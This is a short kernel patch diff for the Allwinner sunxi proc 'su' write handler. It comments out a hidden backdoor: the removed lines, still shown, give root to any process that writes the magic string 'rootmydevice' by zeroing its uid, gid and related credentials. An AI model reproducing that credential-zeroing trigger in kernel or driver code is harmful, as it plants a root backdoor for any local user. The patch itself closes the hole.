@@ -24,7 +24,7 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
  unsigned long count, void *data)
 {
 	char *buf;
-	struct cred *cred;
+// 	struct cred *cred;
 
 	if (count < 1)
 		return -EINVAL;
@@ -39,16 +39,16 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 	}
 
 	if(!strncmp("rootmydevice",(char*)buf,12)){
-		cred = (struct cred *)__task_cred(current);
-		cred->uid = 0;
-		cred->gid = 0;
-		cred->suid = 0;
-		cred->euid = 0;
-		cred->euid = 0;
-		cred->egid = 0;
-		cred->fsuid = 0;
-		cred->fsgid = 0;
-		printk("now you are root\n");
+// 		cred = (struct cred *)__task_cred(current);
+// 		cred->uid = 0;
+// 		cred->gid = 0;
+// 		cred->suid = 0;
+// 		cred->euid = 0;
+// 		cred->euid = 0;
+// 		cred->egid = 0;
+// 		cred->fsuid = 0;
+// 		cred->fsgid = 0;
+		printk("now you are not root!!\n");
 	}
 
 	kfree(buf);
